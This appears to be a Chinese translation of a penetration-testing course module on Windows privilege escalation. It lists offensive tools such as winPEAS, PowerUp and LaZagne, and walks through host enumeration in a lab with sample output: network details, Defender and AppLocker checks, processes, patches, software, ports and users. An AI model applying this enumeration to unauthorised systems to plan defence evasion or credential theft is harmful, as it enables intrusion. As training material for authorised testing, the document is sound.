[21:17:28:771] [28158:28159] [INFO][com.freerdp.crypto] - created directory [/home/user2/.config/freerdp/server]
[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[21:17:28:794] [28158:28159] [WARN][com.freerdp.crypto] - CN = WINLPE-SKILLS1-SRV
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - The hostname used for this connection (10.129.43.36:3389) 
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - Common Name (CN):
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - 	WINLPE-SKILLS1-SRV
[21:17:28:795] [28158:28159] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 10.129.43.36:3389 (RDP-Server):
	Common Name: WINLPE-SKILLS1-SRV
	Subject:     CN = WINLPE-SKILLS1-SRV
	Issuer:      CN = WINLPE-SKILLS1-SRV
	Thumbprint:  9f:f0:dd:28:f5:6f:83:db:5e:8c:5a:e9:5f:50:a4:50:2d:b3:e7:a7:af:f4:4a:8a:1a:08:f3:cb:46:c3:c3:e8
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) y
Password: </code></pre>
<p>模块的许多部分都需要一些工具，例如开源脚本、预编译二进制文件和漏洞利用 PoC。如果适用，这些工​​具可以在<code>C:\Tools</code>目标主机的目录中找到。尽管大多数工具都已提供，但您也可以挑战自己，尝试将文件上传到目标主机（使用文件传输模块中展示的技术），甚至可以使用<a href="https://visualstudio.microsoft.com/downloads/" rel="noreferrer" target="_blank">Visual Studio</a>自行编译一些工具。</p>
<p><strong>Useful Tools</strong></p>
<div class="post-table-wrap"><table><thead><tr><th>Tool</th><th>Description</th></tr></thead><tbody><tr><td><a href="https://github.com/GhostPack/Seatbelt" rel="noreferrer" target="_blank">Seatbelt</a></td><td>用于执行各种本地权限提升检查的 C# 项目</td></tr><tr><td><a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS" rel="noreferrer" target="_blank">winPEAS</a></td><td>是一个脚本，用于在 Windows 主机上搜索可能的提权路径。所有检查的说明如下：</td></tr><tr><td><a href="https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1" rel="noreferrer" target="_blank">PowerUp</a></td><td>用于查找依赖于错误配置的常见 Windows 提权向量的 PowerShell 脚本。它还可以用来利用已发现的一些问题。</td></tr><tr><td><a href="https://github.com/GhostPack/SharpUp" rel="noreferrer" target="_blank">SharpUp</a></td><td>C# 版本的 PowerUp</td></tr><tr><td><a href="https://github.com/411Hall/JAWS" rel="noreferrer" target="_blank">JAWS</a></td><td>用 PowerShell 2.0 编写的用于枚举权限提升向量的 PowerShell 脚本</td></tr><tr><td><a href="https://github.com/Arvanaghi/SessionGopher" rel="noreferrer" target="_blank">SessionGopher</a></td><td>是一款 PowerShell 工具，用于查找并解密远程访问工具保存的会话信息。它可以提取 PuTTY、WinSCP、SuperPuTTY、FileZilla 和 RDP 保存的会话信息。</td></tr><tr><td><a href="https://github.com/rasta-mouse/Watson" rel="noreferrer" target="_blank">Watson</a></td><td>是一个 .NET 工具，旨在枚举缺失的 KB 并建议利用权限提升漏洞。</td></tr><tr><td><a href="https://github.com/AlessandroZ/LaZagne" rel="noreferrer" target="_blank">LaZagne</a></td><td>用于从 Web 浏览器、聊天工具、数据库、Git、电子邮件、内存转储、PHP、系统管理工具、无线网络配置、内部 Windows 密码存储机制等检索存储在本地计算机上的密码的工具</td></tr><tr><td><a href="https://github.com/bitsadmin/wesng" rel="noreferrer" target="_blank">Windows Exploit Suggester - Next Generation</a></td><td>是一款基于 Windows 实用程序输出的工具<code>systeminfo</code>，它提供了操操作系统易受攻击的漏洞列表，以及针对这些漏洞的任何利用方式。它支持 Windows XP 到 Windows 10 之间的所有 Windows 操操作系统，包括其对应的 Windows Server 版本。</td></tr><tr><td><a href="https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite" rel="noreferrer" target="_blank">Sysinternals Suite</a></td><td>我们将在枚举中使用 Sysinternals 的几种工具，包括<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk" rel="noreferrer" target="_blank">AccessChk</a>、<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/pipelist" rel="noreferrer" target="_blank">PipeList</a>和<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psservice" rel="noreferrer" target="_blank">PsService</a></td></tr></tbody></table></div>
<h2>态势感知与环境摸底</h2>
<h3>态势感知</h3>
<p>无论身处何种境地，无论是在日常生活中，还是在网络渗透测试等项目中，时刻把握时间和空间的定位都至关重要。</p>
<p>收集网络信息是我们枚举的关键部分。我们可能会发现主机是双宿主的，而攻陷该主机可能使我们能够横向移动到之前无法访问的网络的另一部分。双宿主意味着主机或服务器属于两个或多个不同的网络，并且在大多数情况下具有多个虚拟或物理网络接口。我们应该始终查看路由表，以查看有关本地网络及其周围网络的信息。我们还可以收集有关本地域的信息（如果主机是Active Directory环境的一部分），包括域控制器的IP地址。使用arp命令查看每个接口的ARP缓存并查看主机最近与之通信的其他主机也很重要。这可以帮助我们在获取凭据后进行横向移动。它可以很好地指示管理员正在通过RDP或WinRM从该主机连接到哪些主机。</p>
<ol><li><strong>网络信息</strong></li></ol>
<p>这些网络信息可能直接或间接地帮助我们提升本地权限。它可能会引导我们通过另一条路径访问某个系统，以便我们能够访问或提升权限；或者，它可能会泄露一些信息，让我们能够利用这些信息进行横向移动，从而在当前系统上提升权限后进一步获得访问权限。</p>
<p><strong>接口、IP地址、DNS信息</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; ipconfig /all</code></pre>
<p><strong>ARP表</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; arp -a</code></pre>
<p><strong>路由表</strong></p>
<pre><code class="language-cmd-session">C:\htb&gt; route print</code></pre>
<p>枚举现有的保护措施将有助于我们确保所使用的方法不会被阻止或检测到，并且在我们必须编写自定义 Payload 或在编译工具之前对其进行修改时，这也会对我们有所帮助。</p>
<ol><li><strong>枚举保护措施</strong></li></ol>
<p>许多组织使用某种应用程序白名单解决方案来控制某些用户可以运行哪些类型的应用程序和文件。这可能被用来尝试阻止非管理员用户运行<code>cmd.exe</code>其<code>PowerShell.exe</code>日常工作不需要的其他二进制文件和文件类型。Microsoft 提供的一个常用解决方案是<a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/applocker/applocker-overview" rel="noreferrer" target="_blank">AppLocker</a>。我们可以使用<a href="https://docs.microsoft.com/en-us/PowerShell/module/applocker/get-applockerpolicy?view=windowsserver2019-ps" rel="noreferrer" target="_blank">GetAppLockerPolicy</a> cmdlet 枚举本地、有效（强制执行）和域 AppLocker 策略。这将帮助我们了解哪些二进制文件或文件类型可能被阻止，以及我们是否需要在枚举过程中或在运行工具或技术来提升权限之前执行某种 AppLocker 绕过。</p>
<ul><li>检查Windows Defender状态</li></ul>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-MpComputerStatus

AMEngineVersion                 : 1.1.17900.7
AMProductVersion                : 4.10.14393.2248
AMServiceEnabled                : True
AMServiceVersion                : 4.10.14393.2248
AntispywareEnabled              : True
AntispywareSignatureAge         : 1
AntispywareSignatureLastUpdated : 3/28/2021 2:59:13 AM
AntispywareSignatureVersion     : 1.333.1470.0
AntivirusEnabled                : True
AntivirusSignatureAge           : 1
AntivirusSignatureLastUpdated   : 3/28/2021 2:59:12 AM
AntivirusSignatureVersion       : 1.333.1470.0
BehaviorMonitorEnabled          : False
ComputerID                      : 54AF7DE4-3C7E-4DA0-87AC-831B045B9063
ComputerState                   : 0
FullScanAge                     : 4294967295
FullScanEndTime                 :
FullScanStartTime               :
IoavProtectionEnabled           : False
LastFullScanSource              : 0
LastQuickScanSource             : 0
NISEnabled                      : False
NISEngineVersion                : 0.0.0.0
NISSignatureAge                 : 4294967295
NISSignatureLastUpdated         :
NISSignatureVersion             : 0.0.0.0
OnAccessProtectionEnabled       : False
QuickScanAge                    : 4294967295
QuickScanEndTime                :
QuickScanStartTime              :
RealTimeProtectionEnabled       : False
RealTimeScanDirection           : 0
PSComputerName                  :</code></pre>
<ul><li>列出 AppLocker 规则</li></ul>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : a9e18c21-ff8f-43cf-b9fc-db40eed693ba
Name                : (Default Rule) All signed packaged apps
Description         : Allows members of the Everyone group to run packaged apps that are signed.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 921cc481-6e17-4653-8f75-050b80acca20
Name                : (Default Rule) All files located in the Program Files folder
Description         : Allows members of the Everyone group to run applications that are located in the Program Files
                      folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : a61c8b2c-a319-4cd0-9690-d2177cad7b51
Name                : (Default Rule) All files located in the Windows folder
Description         : Allows members of the Everyone group to run applications that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : fd686d83-a829-4351-8ff4-27c7de5755d2
Name                : (Default Rule) All files
Description         : Allows members of the local Administrators group to run all applications.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PublisherConditions : {*\*\*,0.0.0.0-*}
PublisherExceptions : {}
PathExceptions      : {}
HashExceptions      : {}
Id                  : b7af7102-efde-4369-8a89-7a6a392d1473
Name                : (Default Rule) All digitally signed Windows Installer files
Description         : Allows members of the Everyone group to run digitally signed Windows Installer files.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\Installer\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 5b290184-345a-4453-b184-45305f6d9a54
Name                : (Default Rule) All Windows Installer files in %systemdrive%\Windows\Installer
Description         : Allows members of the Everyone group to run all Windows Installer files located in
                      %systemdrive%\Windows\Installer.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*.*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 64ad46ff-0d71-4fa0-a30b-3f3d30c5433d
Name                : (Default Rule) All Windows Installer files
Description         : Allows members of the local Administrators group to run all Windows Installer files.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow

PathConditions      : {%PROGRAMFILES%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 06dce67b-934c-454f-a263-2515c8796a5d
Name                : (Default Rule) All scripts located in the Program Files folder
Description         : Allows members of the Everyone group to run scripts that are located in the Program Files folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {%WINDIR%\*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : 9428c672-5fc3-47f4-808a-a0011f36dd2c
Name                : (Default Rule) All scripts located in the Windows folder
Description         : Allows members of the Everyone group to run scripts that are located in the Windows folder.
UserOrGroupSid      : S-1-1-0
Action              : Allow

PathConditions      : {*}
PathExceptions      : {}
PublisherExceptions : {}
HashExceptions      : {}
Id                  : ed97d0cb-15ff-430f-b82c-8d7832957725
Name                : (Default Rule) All scripts
Description         : Allows members of the local Administrators group to run all scripts.
UserOrGroupSid      : S-1-5-32-544
Action              : Allow</code></pre>
<ul><li>测试 AppLocker 策略</li></ul>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -path C:\Windows\System32\cmd.exe -User Everyone

FilePath                    PolicyDecision MatchingRule
--------                    -------------- ------------
C:\Windows\System32\cmd.exe         Denied c:\windows\system32\cmd.exe


PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\*\*\*\*.exe -User Everyone
PS C:\htb&gt; Get-AppLockerPolicy -Local | Test-AppLockerPolicy -Path C:\Windows\System32\WindowsPowerShell\v1.0\PowerShell_ise.exe -User Everyone
</code></pre>
<h3>初始枚举</h3>
<p>在评估过程中，我们可能会在 Windows 主机上获得低权限的 shell（无论是否已加入域），需要进行权限提升以进一步访问。完全入侵主机可能会让我们访问敏感文件/文件共享，获得捕获流量以获取更多凭证的能力，或者获得有助于进一步提升访问权限的凭证，甚至直接升级到 Active Directory 环境中的域管理员权限。根据系统配置和遇到的数据类型，我们可以将权限升级为以下之一：</p>
<ul><li>高度特权的 <code>NT AUTHORITY\SYSTEM</code> 账户，或称 <a href="https://docs.microsoft.com/en-us/windows/win32/services/localsystem-account" rel="noreferrer" target="_blank">LocalSystem</a> 账户，这是一个拥有比本地管理员账户更多权限的高度特权账户，用于运行大多数 Windows 服务。</li><li>内置的本地<code>管理员</code>账户。有些组织禁用了该账户，但许多组织不会。在客户端环境中，该账户在多个系统间重复使用并不罕见。</li><li>另一个本地账户，是本地<code>管理员</code>组的成员。该组中的任何账户都将拥有与内置<code>管理员</code>账户相同的权限。</li><li>一个标准（非特权）域用户，属于本地<code>管理员</code>组。</li><li>一个域管理员（在 Active Directory 环境中拥有高度权限），属于本地<code>管理员组</code> 。</li></ul>
<p><strong>关键数据点</strong></p>
<ul><li><code>OS name</code> <code>系统名称</code> ：了解 Windows 操作系统的类型（工作站或服务器）和级别（Windows 7 或 10，Server 2008、2012、2016、2019 等）可以让我们了解遗留系统中可能可用的工具类型（如 <code>PowerShell</code> 版本），或是否缺乏这些工具。这也能识别可能存在公开漏洞利用的操作系统版本。</li><li><code>Version</code>: 与操作系统版本类似，可能存在针对特定 Windows 版本漏洞的公开漏洞利用。Windows 系统漏洞可能导致系统不稳定甚至彻底崩溃。在任何生产系统上运行这些程序时都要小心，确保在运行前充分了解漏洞及其可能的后果。</li><li><code>Running Services</code> <code>运行服务</code> ：了解主机上运行的服务很重要，尤其是那些以 <code>NT AUTHORITY\SYSTEM</code> 或管理员级账户运行的服务。在特权账户中运行的服务配置错误或易受攻击，往往是权限升级的轻松优势。</li></ul>
<h4>系统信息</h4>
<p>查看系统本身能让我们更好地了解具体操作系统版本、使用的硬件、已安装的程序和安全更新。这将帮助我们缩小寻找缺失补丁及相关 CVE 的范围，以便升级权限。使用<a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist" rel="noreferrer" target="_blank">Tasklist</a>命令查看正在运行的进程，可以让我们更好地了解系统当前运行的应用程序。</p>
<pre><code class="language-cmd">Tasklist</code></pre>
<pre><code class="language-cmd-session">C:\htb&gt; tasklist /svc

Image Name                     PID Services
========================= ======== ============================================
System Idle Process              0 N/A
System                           4 N/A
smss.exe                       316 N/A
csrss.exe                      424 N/A
wininit.exe                    528 N/A
csrss.exe                      540 N/A
winlogon.exe                   612 N/A
services.exe                   664 N/A
lsass.exe                      672 KeyIso, SamSs, VaultSvc
svchost.exe                    776 BrokerInfrastructure, DcomLaunch, LSM,
                                   PlugPlay, Power, SystemEventsBroker
svchost.exe                    836 RpcEptMapper, RpcSs
LogonUI.exe                    952 N/A
dwm.exe                        964 N/A
svchost.exe                    972 TermService
svchost.exe                   1008 Dhcp, EventLog, lmhosts, TimeBrokerSvc
svchost.exe                    364 NcbService, PcaSvc, ScDeviceEnum, TrkWks,
                                   UALSVC, UmRdpService
&lt;...SNIP...&gt;

svchost.exe                   1468 Wcmsvc
svchost.exe                   1804 PolicyAgent
spoolsv.exe                   1884 Spooler
svchost.exe                   1988 W3SVC, WAS
svchost.exe                   1996 ftpsvc
svchost.exe                   2004 AppHostSvc
FileZilla Server.exe          1140 FileZilla Server
inetinfo.exe                  1164 IISADMIN
svchost.exe                   1736 DiagTrack
svchost.exe                   2084 StateRepository, tiledatamodelsvc
VGAuthService.exe             2100 VGAuthService
vmtoolsd.exe                  2112 VMTools
MsMpEng.exe                   2136 WinDefend

&lt;...SNIP...&gt;

FileZilla Server Interfac     5628 N/A
jusched.exe                   5796 N/A
cmd.exe                       4132 N/A
conhost.exe                   4136 N/A
TrustedInstaller.exe          1120 TrustedInstaller
TiWorker.exe                  1816 N/A
WmiApSrv.exe                  2428 wmiApSrv
tasklist.exe                  3596 N/A</code></pre>
<p>熟悉标准的 Windows 进程，如会话管理器子系统（smss.exe）、 客户端服务器运行时子系统（csrss.exe）、<a href="https://en.wikipedia.org/wiki/Winlogon" rel="noreferrer" target="_blank">WinLogon（winlogon.exe）、</a> 本地安全机构子系统服务（LSASS） 和服务主机（svchost.exe） 等，以及与之相关的服务，是至关重要的。能够快速识别标准流程/服务将有助于加快我们的枚举速度，并使我们能够聚焦非标准流程/服务，从而可能开启权限升级的路径。在上述示例中，我们最感兴趣的是 <code>FileZilla</code> FTP 服务器的运行情况，并尝试枚举版本以查找公开漏洞或错误配置，如 FTP 匿名访问，这些可能导致敏感数据暴露甚至更多。</p>
<p>其他流程，比如 <code>MsMpEng.exe</code>、Windows Defender，也很有趣，因为它们可以帮助我们规划目标主机上可能需要规避或绕过的防护措施。</p>
<p><strong>显示所有环境变量</strong> 环境变量解释了主机配置的很多情况。要打印它们，Windows 会提供 <code>set</code> 命令。<code>PATH</code> 是最常被忽视的变量之一。在下面的输出中，没有任何异常。然而，管理员（或应用程序）修改 <code>PATH</code> 的情况并不罕见。一个常见的例子是将 Python 或 Java 置于路径中，这样可以执行 Python 或 。JAR 文件。如果放置在 PATH 中的文件夹是用户可写的，可能可以对其他应用程序进行 DLL 注入。记住，运行程序时，Windows 首先会在 CWD（当前工作目录）中查找该程序，然后从左到右从 PATH 查找该程序。这意味着如果自定义路径放在左侧（在 C：\Windows\System32 之前），它比右侧危险得多。</p>
<p>除了 PATH， <code>set</code>还可以提供其他有用信息，比如 HOME DRIVE。在企业中，这通常是文件共享。直接进入文件共享页面可能会显示其他可访问的目录。能够访问“IT 目录”并不罕见，该目录包含包含密码的库存表格。此外，共享用于家庭目录，用户可以登录其他电脑，拥有相同的体验/文件/桌面等（ 漫游配置文件 ）。这也可能意味着用户会携带恶意物品。如果文件被放置在 <code>USERPROFILE\AppData\Microsoft\Windows\Start Menu\Programs\Startup</code> 中，当用户登录另一台机器时，该文件将被执行。</p>
<pre><code class="language-cmd-session">C:\htb&gt; set

ALLUSERSPROFILE=C:\ProgramData
APPDATA=C:\Users\Administrator\AppData\Roaming
CommonProgramFiles=C:\Program Files\Common Files
CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
CommonProgramW6432=C:\Program Files\Common Files
COMPUTERNAME=WINLPE-SRV01
ComSpec=C:\Windows\system32\cmd.exe
HOMEDRIVE=C:
HOMEPATH=\Users\Administrator
LOCALAPPDATA=C:\Users\Administrator\AppData\Local
LOGONSERVER=\\WINLPE-SRV01
NUMBER_OF_PROCESSORS=6
OS=Windows_NT
Path=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\;C:\Users\Administrator\AppData\Local\Microsoft\WindowsApps;
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC
PROCESSOR_ARCHITECTURE=AMD64
PROCESSOR_IDENTIFIER=AMD64 Family 23 Model 49 Stepping 0, AuthenticAMD
PROCESSOR_LEVEL=23
PROCESSOR_REVISION=3100
ProgramData=C:\ProgramData
ProgramFiles=C:\Program Files
ProgramFiles(x86)=C:\Program Files (x86)
ProgramW6432=C:\Program Files
PROMPT=$P$G
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
PUBLIC=C:\Users\Public
SESSIONNAME=Console
SystemDrive=C:
SystemRoot=C:\Windows
TEMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
TMP=C:\Users\ADMINI~1\AppData\Local\Temp\1
USERDOMAIN=WINLPE-SRV01
USERDOMAIN_ROAMINGPROFILE=WINLPE-SRV01
USERNAME=Administrator
USERPROFILE=C:\Users\Administrator
windir=C:\Windows </code></pre>
<p><strong>查看详细配置信息</strong> <code>systeminfo</code> 命令会显示该设备是否最近被打过修补，以及它是虚拟机。如果设备最近没有被修补，获得管理员级别访问权限可能只需运行已知的漏洞利用即可。谷歌热修复下安装的知识库，了解盒子什么时候被修补。这些信息并不总是存在，因为热修复软件可以对非管理员隐藏。还可以查看<code>系统启动时间</code>和<code>操作系统版本</code> ，以了解补丁级别。如果盒子六个月以上没有重启，很可能也没有被修补。</p>
<p>此外，许多指南会说网络信息很重要，因为它可能表明机器是双宿主的（连接多个网络）。一般来说，对于企业来说，设备会通过防火墙规则获得访问其他网络的权限，而不会有实体线缆连接。</p>
<pre><code class="language-cmd-session">C:\htb&gt; systeminfo

Host Name:                 WINLPE-SRV01
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30000-00299-AA303
Original Install Date:     3/24/2021, 3:46:32 PM
System Boot Time:          3/25/2021, 9:24:36 AM
System Manufacturer:       VMware, Inc.
System Model:              VMware7,1
System Type:               x64-based PC
Processor(s):              3 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [02]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
                           [03]: AMD64 Family 23 Model 49 Stepping 0 AuthenticAMD ~2994 Mhz
BIOS Version:              VMware, Inc. VMW71.00V.16707776.B64.2008070230, 8/7/2020
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume2
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC-08:00) Pacific Time (US &amp; Canada)
Total Physical Memory:     6,143 MB
Available Physical Memory: 3,474 MB
Virtual Memory: Max Size:  10,371 MB
Virtual Memory: Available: 7,544 MB
Virtual Memory: In Use:    2,827 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    WORKGROUP
Logon Server:              \\WINLPE-SRV01
Hotfix(s):                 3 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB5001078
                           [03]: KB4103723
Network Card(s):           2 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    Yes
                                 DHCP Server:     10.129.0.1
                                 IP address(es)
                                 [01]: 10.129.43.8
                                 [02]: fe80::e4db:5ea3:2775:8d4d
                                 [03]: dead:beef::e4db:5ea3:2775:8d4d
                           [02]: vmxnet3 Ethernet Adapter
                                 Connection Name: Ethernet1
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 192.168.20.56
                                 [02]: fe80::f055:fefd:b1b:9919
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.</code></pre>
<p><strong>补丁与更新</strong> 如果 <code>systeminfo</code> 不显示热修复，可以通过 <a href="https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page" rel="noreferrer" target="_blank">WMI-Command</a> 二进制和 QFE（快速修复工程） 来查询补丁。</p>
<pre><code class="language-cmd-session">C:\htb&gt; wmic qfe

Caption                                     CSName        Description      FixComments  HotFixID   InstallDate  InstalledBy          InstalledOn  Name  ServicePackInEffect  Status
http://support.microsoft.com/?kbid=3199986  WINLPE-SRV01  Update                        KB3199986               NT AUTHORITY\SYSTEM  11/21/2016
https://support.microsoft.com/help/5001078  WINLPE-SRV01  Security Update               KB5001078               NT AUTHORITY\SYSTEM  3/25/2021
http://support.microsoft.com/?kbid=4103723  WINLPE-SRV01  Security Update               KB4103723               NT AUTHORITY\SYSTEM  3/25/2021</code></pre>
<p>我们也可以用 PowerShell 通过 Get-Hotfix cmdlet 实现这一点。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-HotFix | ft -AutoSize

Source       Description     HotFixID  InstalledBy                InstalledOn
------       -----------     --------  -----------                -----------
WINLPE-SRV01 Update          KB3199986 NT AUTHORITY\SYSTEM        11/21/2016 12:00:00 AM
WINLPE-SRV01 Update          KB4054590 WINLPE-SRV01\Administrator 3/30/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB5001078 NT AUTHORITY\SYSTEM        3/25/2021 12:00:00 AM
WINLPE-SRV01 Security Update KB3200970 WINLPE-SRV01\Administrator 4/13/2021 12:00:00 AM</code></pre>
<p><strong>已安装的程序</strong> WMI 也可以用于显示已安装的软件。这些信息常常能引导我们找到难以发现的漏洞。<code>FileZilla</code>/<code>Putty</code> 等安装了吗？运行 <code>LaZagne</code> 检查这些应用存储的凭证是否已安装。此外，有些程序可能被安装并作为易受攻击的服务运行。</p>
<pre><code class="language-cmd-session">C:\htb&gt; wmic product get name

Name
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.24.28127
Java 8 Update 231 (64-bit)
Microsoft Visual C++ 2019 X86 Additional Runtime - 14.24.28127
VMware Tools
Microsoft Visual C++ 2019 X64 Minimum Runtime - 14.24.28127
Microsoft Visual C++ 2019 X86 Minimum Runtime - 14.24.28127
Java Auto Updater

&lt;SNIP&gt;</code></pre>
<p>当然，我们也可以用 PowerShell 使用 Get-WmiObject cmdlet 实现这一点。</p>
<pre><code class="language-PowerShell-session">PS C:\htb&gt; Get-WmiObject -Class Win32_Product |  select Name, Version

Name                                                                    Version
----                                                                    -------
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
Microsoft OLE DB Driver for SQL Server                                  18.3.0.0
Microsoft Visual C++ 2010  x64 Redistributable - 10.0.40219             10.0.40219
Microsoft Help Viewer 2.3                                               2.3.28107
Microsoft Visual C++ 2010  x86 Redistributable - 10.0.40219             10.0.40219
Microsoft Visual C++ 2013 x86 Minimum Runtime - 12.0.21005              12.0.21005
Microsoft Visual C++ 2013 x86 Additional Runtime - 12.0.21005           12.0.21005
Microsoft Visual C++ 2019 X64 Additional Runtime - 14.28.29914          14.28.29914
Microsoft ODBC Driver 13 for SQL Server                                 13.2.5026.0
SQL Server 2016 Database Engine Shared                                  13.2.5026.0
SQL Server 2016 Database Engine Services                                13.2.5026.0
SQL Server Management Studio for Reporting Services                     15.0.18369.0
Microsoft SQL Server 2008 Setup Support Files                           10.3.5500.0
SSMS Post Install Tasks                                                 15.0.18369.0
Microsoft VSS Writer for SQL Server 2016                                13.2.5026.0
Java 8 Update 231 (64-bit)                                              8.0.2310.11
Browser for SQL Server 2016                                             13.2.5026.0
Integration Services                                                    15.0.2000.130

&lt;SNIP&gt;</code></pre>
<p><strong>显示运行进程</strong> <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat" rel="noreferrer" target="_blank">netstat</a> 命令会显示当前的 TCP 和 UDP 连接，这能让我们更好地了解哪些服务在本地和外部可访问的端口上监听。我们可能会发现只有本地主机（登录主机时）才能访问的有漏洞服务，可以利用它来升级权限。</p>
<pre><code class="language-cmd-session">PS C:\htb&gt; netstat -ano

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:21             0.0.0.0:0              LISTENING       1096
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       840
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1433           0.0.0.0:0              LISTENING       3520
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       968
&lt;...SNIP...&gt;

netstat -ano | findstr :8080

tasklist /svc | findstr 2400

</code></pre>
<p><strong>User &amp; Group 信息</strong> 用户往往是组织中最薄弱的一环，尤其是在系统配置和打补丁良好的情况下。了解系统中的用户和组、能够提供管理员权限的特定组成员、当前用户的权限、密码策略信息以及我们可能针对的登录用户，这一点至关重要。我们可能觉得系统已经打了很强的补丁，但本地管理员组的用户目录中有成员可以浏览，并且包含像 <code>logins.xlsx</code> 这样的密码文件，因此很容易获胜。</p>
<p><strong>已登陆用户，Logged-In Users</strong> 确定哪些用户登录系统始终很重要。它们是闲置还是活跃？我们能确定他们在做什么吗？虽然执行起来更具挑战性，但有时我们可以直接攻击用户以提升权限或获得更多访问权限。在规避交战中，我们需要在主机上小心翼翼地行动，同时其他用户正在作，以避免被发现。</p>
<pre><code class="language-cmd-session">C:\htb&gt; query user

 USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME
&gt;administrator         rdp-tcp#2           1  Active          .  3/25/2021 9:27 AM</code></pre>
